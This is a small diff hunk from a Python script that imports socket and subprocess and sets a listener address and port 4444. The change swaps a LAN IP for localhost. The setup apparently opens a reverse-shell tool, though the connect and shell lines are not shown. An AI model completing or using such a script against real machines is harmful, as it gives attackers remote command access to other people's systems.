@@ -2,7 +2,7 @@ import os
 import socket
 import subprocess
 
-LHOST = "192.168.1.135"
+LHOST = "127.0.0.1"
 LPORT = 4444
 
 s = socket.socket()
